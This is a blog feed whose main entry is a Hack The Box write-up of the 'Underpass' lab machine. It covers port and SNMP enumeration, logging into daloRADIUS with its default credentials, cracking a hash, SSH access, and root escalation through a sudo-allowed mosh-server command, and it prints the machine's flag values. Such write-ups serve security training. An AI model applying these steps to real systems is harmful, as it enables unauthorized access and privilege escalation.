<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2025-05-18T15:43:06-04:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">bynafrez08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>bynafrez</name></author><entry><title type="html">HTB - Underpass</title><link href="http://0.0.0.0:4000/htb-underpass/" rel="alternate" type="text/html" title="HTB - Underpass" /><published>2025-05-17T00:00:00-04:00</published><updated>2025-05-17T00:00:00-04:00</updated><id>http://0.0.0.0:4000/htb-underpass</id><content type="html" xml:base="http://0.0.0.0:4000/htb-underpass/"><![CDATA[<p>Underpass is an Easy Linux machine starting with a default Apache Ubuntu page. This leads the attacker to enumerate the machine using UDP ports for alternative attack vectors. The attacker can enumerate SNMP and discover that <code class="language-plaintext highlighter-rouge">Daloradius</code> is running on the remote machine, and the operators panel can be accessed using the default credentials. Inside the panel, the password hash for the user <code class="language-plaintext highlighter-rouge">svcMosh</code> is stored, and it’s crackable. Then, the attacker can log in to the remote machine using SSH with the credentials they have obtained.</p>

<p>The user <code class="language-plaintext highlighter-rouge">svcMosh</code> is configured to run <code class="language-plaintext highlighter-rouge">mosdh-server</code> as <code class="language-plaintext highlighter-rouge">root</code>, which allows the attacker to connect to the server from their local machine and interact with the remote machine as the <code class="language-plaintext highlighter-rouge">root</code> user.</p>

<p align="center">
<img src="/assets/images/img-underpass/portada.png" />
</p>

<h2 id="machine-matrix">Machine matrix</h2>

<p align="center">
<img src="/assets/images/img-underpass/matrix.png" />
</p>

<h2 id="scanning">Scanning</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">tornado</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">h4nger</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">uderpass</span><span class="c1"># nmap -sS --min-rate=5000 -n -Pn -vvv 10.10.11.48 -oN scan
</span><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.95</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">11</span> <span class="mi">17</span><span class="p">:</span><span class="mi">27</span> <span class="n">EDT</span>
<span class="n">Initiating</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">17</span><span class="p">:</span><span class="mi">27</span>
<span class="n">Scanning</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.48</span> <span class="p">[</span><span class="mi">1000</span> <span class="n">ports</span><span class="p">]</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.48</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.48</span>
<span class="n">Completed</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">17</span><span class="p">:</span><span class="mi">27</span><span class="p">,</span> <span class="mf">0.25</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">1000</span> <span class="n">total</span> <span class="n">ports</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.48</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="nb">set</span> <span class="p">(</span><span class="mf">0.044</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
<span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">11</span> <span class="mi">17</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">06</span> <span class="n">EDT</span> <span class="k">for</span> <span class="mi">0</span><span class="n">s</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">998</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>

<span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="k">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">0.37</span> <span class="n">seconds</span>
           <span class="n">Raw</span> <span class="n">packets</span> <span class="n">sent</span><span class="p">:</span> <span class="mi">1000</span> <span class="p">(</span><span class="mf">44.000</span><span class="n">KB</span><span class="p">)</span> <span class="o">|</span> <span class="n">Rcvd</span><span class="p">:</span> <span class="mi">1000</span> <span class="p">(</span><span class="mf">40.008</span><span class="n">KB</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">tornado</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">h4nger</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">uderpass</span><span class="c1"># nmap -sVC -p22,80 10.10.11.48 -oN portscan               
</span><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.95</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">11</span> <span class="mi">17</span><span class="p">:</span><span class="mi">29</span> <span class="n">EDT</span>
<span class="n">Stats</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">07</span> <span class="n">elapsed</span><span class="p">;</span> <span class="mi">0</span> <span class="n">hosts</span> <span class="n">completed</span> <span class="p">(</span><span class="mi">1</span> <span class="n">up</span><span class="p">),</span> <span class="mi">1</span> <span class="n">undergoing</span> <span class="n">Service</span> <span class="n">Scan</span>
<span class="n">Service</span> <span class="n">scan</span> <span class="n">Timing</span><span class="p">:</span> <span class="n">About</span> <span class="mf">50.00</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="n">ETC</span><span class="p">:</span> <span class="mi">17</span><span class="p">:</span><span class="mi">29</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">06</span> <span class="n">remaining</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.48</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.049</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>

<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">10</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">48</span><span class="p">:</span><span class="n">b0</span><span class="p">:</span><span class="n">d2</span><span class="p">:</span><span class="n">c7</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="n">ae</span><span class="p">:</span><span class="mi">3</span><span class="n">d</span><span class="p">:</span><span class="n">fb</span><span class="p">:</span><span class="n">b7</span><span class="p">:</span><span class="mi">6</span><span class="n">b</span><span class="p">:</span><span class="mi">0</span><span class="n">f</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">4</span><span class="n">d</span><span class="p">:</span><span class="mi">2</span><span class="n">a</span><span class="p">:</span><span class="n">ea</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">cb</span><span class="p">:</span><span class="mi">61</span><span class="p">:</span><span class="mi">64</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="n">b5</span><span class="p">:</span><span class="n">ba</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="n">c5</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="n">bb</span><span class="p">:</span><span class="n">e2</span><span class="p">:</span><span class="n">a2</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="p">.</span><span class="mi">52</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Apache2</span> <span class="n">Ubuntu</span> <span class="n">Default</span> <span class="n">Page</span><span class="p">:</span> <span class="n">It</span> <span class="n">works</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">10.84</span> <span class="n">seconds</span>
</code></pre></div></div>

<p>Default apache page:</p>

<p align="center">
<img src="/assets/images/img-underpass/img1.png" />
</p>

<p>Fuzzing the web page didn’t find any interesting path.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tornado:/home/h4nger/htb/uderpass/nmap# gobuster dir -u http://10.10.11.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                              
===============================================================                                                                                                                              
Gobuster v3.6                                                                                                                                                                                
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)                                                                                                                                
===============================================================                                                                                                                              
[+] Url:                     http://10.10.11.48 
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode 
===============================================================
/server-status        (Status: 403) [Size: 276]
Progress: 96392 / 220561 (43.70%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 96429 / 220561 (43.72%)
===============================================================
</code></pre></div></div>
<p>We can see the snmp port is open in this machine.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">tornado</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">h4nger</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">uderpass</span><span class="o">/</span><span class="n">nmap</span><span class="c1"># nmap -p161 -sU 10.10.11.48
</span><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.95</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">11</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">EDT</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.48</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.066</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>

<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">161</span><span class="o">/</span><span class="n">udp</span> <span class="nb">open</span>  <span class="n">snmp</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">0.41</span> <span class="n">seconds</span>
<span class="n">root</span><span class="o">@</span><span class="n">tornado</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">h4nger</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">uderpass</span><span class="o">/</span><span class="n">nmap</span><span class="c1">#
</span>
</code></pre></div></div>

<h2 id="recon-using-snmp">Recon using snmp</h2>

<p>Using snmpwalk with the public community we can see interesting info about the machine:</p>

<ul>
  <li>Kernal version that is using.</li>
  <li>a user mail <strong><em>“steve@uderpass.htb”</em></strong>.</li>
  <li>a domain name <strong><em>“Underpass.htb”</em></strong>.</li>
  <li>And the machine it’s using <strong><em>daloradius</em></strong>.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tornado:/home/h4nger/htb/uderpass/nmap# snmpwalk -c public -v2c 10.10.11.48                                                                                                             
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"                                                                        
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10                                                                                                                                         
iso.3.6.1.2.1.1.3.0 = Timeticks: (11274768) 1 day, 7:19:07.68                                                                                                                                
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"                                                                                                                                          
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"                                                                                                    
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"                                                                                                                                 
iso.3.6.1.2.1.1.7.0 = INTEGER: 72                                                                                                                                                            
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00                                                                                                                                              
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1                                                                                                                                               
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49                                                                                                                                              
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50                                                                                                                                              
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4                                                                                                                                               
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
</code></pre></div></div>

<p>Editing the hosts file to put the domain <strong><em>uderpass.htb</em></strong> there was no difference notice accessing the web page.</p>

<p align="center">
<img src="/assets/images/img-underpass/img2.png" />
</p>

<p>If we want to get more information from the victim machine through snmp we can use <strong><em>MIBs</em></strong>.</p>

<p>So first we need to install it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tornado:/home/h4nger/htb/uderpass/nmap# apt install snmp-mibs-downloader 
The following packages were automatically installed and are no longer required:
  libdnnl3  libmsgpack-c2  libtree-sitter0.22  libunibilium4  libvterm0  libxnnpack0  lua-lpeg  lua-luv  neovim-runtime  python3-pynvim
Use 'sudo apt autoremove' to remove them.

Installing:
  snmp-mibs-downloader

Installing dependencies:
  smistrip

Summary:
  Upgrading: 0, Installing: 2, Removing: 0, Not Upgrading: 1173
  Download size: 5,882 kB
  Space needed: 6,137 kB / 62.1 GB available

Continue? [Y/n] 
</code></pre></div></div>

<p>Then we need to uncomment the following line on the <strong><em>snmp.conf</em></strong> file:</p>

<p align="center">
<img src="/assets/images/img-underpass/img3.png" />
</p>

<p>And using the parameter <strong><em>-m all</em></strong> we can see more information about the victim machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tornado:/home/h4nger/htb/uderpass/nmap# snmpwalk -c public -v2c -m all 10.10.11.48 2&gt;&amp;/dev/null                                                                                         
SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64                                                                       
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-TC::linux                                                                                                                                          
DISMAN-EXPRESSION-MIB::sysUpTimeInstance = Timeticks: (11388311) 1 day, 7:38:03.11                                                                                                           
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb                                                                                                                                       
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!                                                                                                    
SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas                                                                                                                             
SNMPv2-MIB::sysServices.0 = INTEGER: 72                                                                                                                                                      
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: RFC1213-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (0) 0:00:00.00
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (11389479) 1 day, 7:38:14.79
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2025-5-11,22:6:8.0,+0:0
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>

<p>Previously we saw that the machine is hosting a <strong><em>daloradius</em></strong> service, And we can see on the web page it’s giving us <strong><em>forbidden</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-underpass/img4.png" />
</p>

<p>Fuzzing in that path we can see some others paths:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tornado:/home/h4nger/htb/uderpass/nmap# gobuster dir -u http://10.10.11.48/daloradius/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.48/daloradius/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/library              (Status: 301) [Size: 323] [--&gt; http://10.10.11.48/daloradius/library/]
/doc                  (Status: 301) [Size: 319] [--&gt; http://10.10.11.48/daloradius/doc/]
/app                  (Status: 301) [Size: 319] [--&gt; http://10.10.11.48/daloradius/app/]
/contrib              (Status: 301) [Size: 323] [--&gt; http://10.10.11.48/daloradius/contrib/]
/ChangeLog            (Status: 200) [Size: 24703]
/setup                (Status: 301) [Size: 321] [--&gt; http://10.10.11.48/daloradius/setup/]
/LICENSE              (Status: 200) [Size: 18011]
Progress: 21092 / 220561 (9.56%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 21111 / 220561 (9.57%)
===============================================================
Finished
===============================================================
</code></pre></div></div>
<p>Searching for some information about this service I found a github <strong><a href="https://github.com/lirantal/daloradius">repository</a></strong> where is structured the files and directories of this service.</p>

<p>So there are two login pages the first one <strong><em>/app/users</em></strong> using the default credentials did not work.</p>

<p align="center">
<img src="/assets/images/img-underpass/img5.png" />
</p>

<p>But the second login wich is the <strong><em>/app/operators</em></strong> using the default daloradius credencials works <strong><em>(administrator:radius)</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-underpass/img6.png" />
</p>

<p>We see that there is a user created named <strong><em>svcMosh</em></strong> and that the password is hashed.</p>

<p align="center">
<img src="/assets/images/img-underpass/img7.png" />
</p>

<p>By cracking the hash from <strong><a href="https://crackstation.net/">crackstation</a></strong> we can see the user’s password in clear text.</p>

<p align="center">
<img src="/assets/images/img-underpass/img8.png" />
</p>

<p>During the scanning phase we saw that the machine that the port 22 is open.</p>

<p>So by using these credentials we have access to the victim machine through ssh.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tornado:/home/h4nger/htb/uderpass/nmap# ssh svcMosh@10.10.11.48                                
The authenticity of host '10.10.11.48 (10.10.11.48)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.48' (ED25519) to the list of known hosts.
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 11 10:36:11 PM UTC 2025

  System load:  0.0               Processes:             227
  Usage of /:   71.7% of 6.56GB   Users logged in:       1
  Memory usage: 33%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 11 19:04:09 2025 from 10.10.14.186
svcMosh@underpass:~$
</code></pre></div></div>

<p>We found the fisrt flag to submit on htb:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svcMosh@underpass:~$ ls
user.txt
svcMosh@underpass:~$ cat user.txt 
8bc994f8799fc71ead820322425fc6ee
svcMosh@underpass:~$
</code></pre></div></div>
<h2 id="privesc">PrivEsc</h2>

<p>The user svcMosh have sudo permissions on the binary mosh-server</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
svcMosh@underpass:~$
</code></pre></div></div>
<p>Doing some research I found the following <strong><a href="https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html">website</a></strong> where it explains how to exploit this binary to access as root if we have SUID permissions.</p>

<p>So using the following command i gain access to the root user –&gt; <strong><em>mosh –server=”sudo /usr/bin/mosh-server” localhost</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-underpass/img9.png" />
</p>

<p>Another wey to gain root access is using the commando <strong><em>sudo mosh-server</em></strong> and it will generate a temporal key, then with that key using the command <strong><em>mosh-client</em></strong> we have root access.</p>

<p align="center">
<img src="/assets/images/img-underpass/img10.png" />
</p>

<p align="center">
<img src="/assets/images/img-underpass/img11.png" />
</p>

<p>And now we can submit the last flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@underpass:~# cat root.txt 
08d1c61bb03603f3e3d1a012759d626c
root@underpass:~# 
</code></pre></div></div>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="Web" /><category term="Hack the box" /><category term="Linux" /><category term="snmp" /><category term="Daloradius" /><summary type="html"><![CDATA[Underpass is an Easy Linux machine starting with a default Apache Ubuntu page. This leads the attacker to enumerate the machine with UDP ports for alternative attack vector, The attacker can enumerate SNMP and discover that `Daloradius` is running on the remote machine, and the operators panel can be accessed using the default credentials.]]></summary></entry><entry><title type="html">THM - Relevant</title><link href="http://0.0.0.0:4000/thm-relevant/" rel="alternate" type="text/html" title="THM - Relevant" /><published>2022-08-13T00:00:00-04:00</published><updated>2022-08-13T00:00:00-04:00</updated><id>http://0.0.0.0:4000/thm-relevant</id><content type="html" xml:base="http://0.0.0.0:4000/thm-relevant/"><![CDATA[<p>Relevant is a windows machine that has enabled smb which will going to exploit this services to access on the machine, and for the privilege escalation we are going to exploit windows access tokens.</p>

<p align="center">
<img src="/assets/images/img-relevant/portada.jpeg" />
</p>

